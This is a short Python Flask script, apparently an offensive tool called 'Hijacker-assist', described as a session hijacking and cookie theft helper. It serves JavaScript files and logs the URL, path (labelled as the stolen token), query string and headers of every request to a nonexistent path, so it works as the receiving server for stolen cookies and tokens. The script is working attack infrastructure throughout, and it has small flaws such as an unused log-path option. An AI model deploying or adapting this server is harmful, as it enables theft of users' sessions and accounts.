#!/usr/bin/python3

from flask import Flask, request, jsonify, send_from_directory
import argparse
############# Flask Routes #################
app = Flask(__name__,static_url_path='')
#------------------------------------------
@app.route('/info', methods=['GET','POST']) # Print info 
def info():
    return "<h3>Hijacker-assist v0.2 By Milad Fadavvi</h3>" 
#------------------------------------------
@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('js', path)
#------------------------------------------
@app.errorhandler(404) # Save recieved information // Path: non-exist path
@app.errorhandler(400) # maybe help someone!
@app.errorhandler(500) # maybe help someone else!!
def SaveData(e):
    LogFile = open ("log.txt", "a+")
    LogFile.write("-" * 33 + '\n')
    LogFile.write("URL: {} \n".format(request.url))
    if len(request.args) > 0:
        LogFile.write("Args: {} \n".format(request.args[0]))
    
    LogFile.write("Path\\thieved Token: {} \n".format(request.path))
    if len(request.query_string) > 0:
        LogFile.write("Query String: {} \n".format(request.query_string).encode('utf-8'))
    LogFile.write("Headers: [{}]\n".format(request.headers).replace('\r\n',' , '))
    LogFile.close()
    return jsonify ({})
#------------------------------------------
############# Main Function ########################
if __name__ == "__main__":
    global Arguments
    #------------------------------------------
    parser = argparse.ArgumentParser(description='Hijacker-assist v0.2: Session Hijacking/Cookie Thieve Helper')
    parser.add_argument('--log', default='hijacker-assist.log' , help='Path of log file')
    parser.add_argument('--port', default=1337 , help='Port for HTTP server Listening')
    parser.add_argument('--ip', default='0.0.0.0' , help='IP for HTTP servr Listening e.g. : 0.0.0.0')
    Arguments = parser.parse_args()
    #------------------------------------------
    try:
        app.run(host=Arguments.ip , port=int(Arguments.port),threaded=True) ## run server with given Args
    except:
        parser.print_help()